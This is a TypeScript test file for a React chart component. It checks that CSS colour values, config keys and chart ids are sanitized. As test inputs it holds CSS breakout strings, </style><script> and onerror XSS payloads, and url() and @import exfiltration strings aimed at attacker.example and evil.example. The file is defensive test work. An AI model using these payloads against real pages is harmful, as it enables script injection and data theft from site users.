import assert from "node:assert/strict"
import { describe, it } from "node:test"
import * as React from "react"
import { renderToStaticMarkup } from "react-dom/server"
import {
  ChartStyle,
  sanitizeChartColor,
  sanitizeChartIdentifier,
  type ChartConfig,
} from "../../../components/ui/chart"

describe("F-UX T-096: ChartStyle CSS identifier & color value sanitization", () => {
  it("preserves safe hex, rgb/rgba, hsl/hsla, oklch, and var(--token) colors on valid identifiers", () => {
    const validConfig: ChartConfig = {
      emerald_hex: { label: "Emerald", color: "#0A3622" },
      short_hex: { label: "White", color: "#fff" },
      alpha_hex: { label: "Gold Alpha", color: "#C5A059CC" },
      rgb_val: { label: "RGB", color: "rgb(10, 54, 34)" },
      rgba_val: { label: "RGBA", color: "rgba(10, 54, 34, 0.85)" },
      hsl_val: { label: "HSL", color: "hsl(155, 80%, 26%)" },
      hsla_val: { label: "HSLA", color: "hsla(155, 80%, 26%, 0.5)" },
      hsl_wrapped_var: { label: "HSL Var", color: "hsl(var(--chart-1))" },
      oklch_val: { label: "OKLCH", color: "oklch(0.72 0.12 85)" },
      oklch_alpha: { label: "OKLCH Alpha", color: "oklch(0.26 0.08 155 / 0.9)" },
      css_var: { label: "Theme Var", color: "var(--chart-1)" },
      themed_series: {
        label: "Themed",
        theme: {
          light: "oklch(0.26 0.08 155)",
          dark: "var(--chart-2)",
        },
      },
    }

    const html = renderToStaticMarkup(
      React.createElement(ChartStyle, {
        id: "chart-pipeline_overview-1",
        config: validConfig,
      })
    )

    assert.ok(html.startsWith("<style>"), "Expected a rendered <style> element")
    assert.match(html, /\[data-chart=chart-pipeline_overview-1\]/)
    assert.match(html, /--color-emerald_hex:\s*#0A3622;/)
    assert.match(html, /--color-short_hex:\s*#fff;/)
    assert.match(html, /--color-alpha_hex:\s*#C5A059CC;/)
    assert.match(html, /--color-rgb_val:\s*rgb\(10, 54, 34\);/)
    assert.match(html, /--color-rgba_val:\s*rgba\(10, 54, 34, 0\.85\);/)
    assert.match(html, /--color-hsl_val:\s*hsl\(155, 80%, 26%\);/)
    assert.match(html, /--color-hsla_val:\s*hsla\(155, 80%, 26%, 0\.5\);/)
    assert.match(html, /--color-hsl_wrapped_var:\s*hsl\(var\(--chart-1\)\);/)
    assert.match(html, /--color-oklch_val:\s*oklch\(0\.72 0\.12 85\);/)
    assert.match(html, /--color-oklch_alpha:\s*oklch\(0\.26 0\.08 155 \/ 0\.9\);/)
    assert.match(html, /--color-css_var:\s*var\(--chart-1\);/)
    assert.match(html, /--color-themed_series:\s*oklch\(0\.26 0\.08 155\);/)
  })

  it("strips/skips CSS breakout and XSS payloads in color values (;, {, }, url(, @import, </style>)", () => {
    const maliciousColors: ChartConfig = {
      breakout_rule: {
        color: "red; } body { display: none; } .x { color: blue",
      },
      style_tag_xss: {
        color: "</style><script>window.__pwned = 1</script><style>",
      },
      url_exfil: {
        color: "url(https://attacker.example/exfil?secret=1)",
      },
      import_exfil: {
        color: "@import url('https://attacker.example/evil.css')",
      },
      nested_rgb_url: {
        color: "rgb(0, 0, 0) url(javascript:alert(1))",
      },
      bad_var: {
        color: "var(--chart-1); background-image: url(https://evil.example)",
      },
      safe_fallback: {
        color: "#0A3622",
      },
    }

    const html = renderToStaticMarkup(
      React.createElement(ChartStyle, {
        id: "chart-safe-1",
        config: maliciousColors,
      })
    )

    assert.ok(!html.includes("</style><script>"), "Must block </style> tag breakout")
    assert.ok(!html.includes("display: none"), "Must block arbitrary CSS rule injection")
    assert.ok(!html.includes("url("), "Must block url() CSS exfiltration")
    assert.ok(!html.includes("@import"), "Must block @import CSS injection")
    assert.ok(!html.includes("--color-breakout_rule"), "Unsafe breakout color must be skipped")
    assert.ok(!html.includes("--color-style_tag_xss"), "XSS color payload must be skipped")
    assert.ok(!html.includes("--color-url_exfil"), "url() color payload must be skipped")
    assert.ok(!html.includes("--color-import_exfil"), "@import color payload must be skipped")
    assert.ok(!html.includes("--color-nested_rgb_url"), "Compound url() payload must be skipped")
    assert.ok(!html.includes("--color-bad_var"), "Tainted var() payload must be skipped")
    assert.match(html, /--color-safe_fallback:\s*#0A3622;/, "Valid sibling series must still render")
  })

  it("sanitizes/skips unsafe ChartConfig keys and unsafe chart id selectors", () => {
    assert.equal(sanitizeChartIdentifier("chart_1-alpha"), "chart_1-alpha")
    assert.equal(sanitizeChartIdentifier("bad;id"), null)
    assert.equal(sanitizeChartIdentifier("id] { color: red }"), null)
    assert.equal(sanitizeChartColor("oklch(0.72 0.12 85)"), "oklch(0.72 0.12 85)")
    assert.equal(sanitizeChartColor("red; } body { display: none"), null)

    const maliciousKeysConfig: ChartConfig = {
      "bad;key}body{background:red": { color: "#0A3622" },
      "</style><img src=x onerror=alert(1)>": { color: "#C5A059" },
      "space key": { color: "#112233" },
      valid_series_key: { color: "var(--chart-3)" },
    }

    const htmlWithValidId = renderToStaticMarkup(
      React.createElement(ChartStyle, {
        id: "chart-valid",
        config: maliciousKeysConfig,
      })
    )

    assert.ok(!htmlWithValidId.includes("background:red"))
    assert.ok(!htmlWithValidId.includes("onerror="))
    assert.ok(!htmlWithValidId.includes("--color-space key"))
    assert.match(htmlWithValidId, /--color-valid_series_key:\s*var\(--chart-3\);/)

    const htmlWithMaliciousId = renderToStaticMarkup(
      React.createElement(ChartStyle, {
        id: "chart-1] { body { visibility: hidden } } [data-chart=x",
        config: { valid_series_key: { color: "#0A3622" } },
      })
    )

    assert.equal(
      htmlWithMaliciousId,
      "",
      "Unsafe chart id selector failing ^[a-zA-Z0-9_-]+$ must render nothing"
    )
  })

  it("renders null when all configured entries fail sanitization", () => {
    const allInvalid: ChartConfig = {
      bad1: { color: "expression(alert(1))" },
      bad2: { color: "#zzzzzz" },
    }

    const html = renderToStaticMarkup(
      React.createElement(ChartStyle, {
        id: "chart-empty",
        config: allInvalid,
      })
    )

    assert.equal(html, "")
  })
})
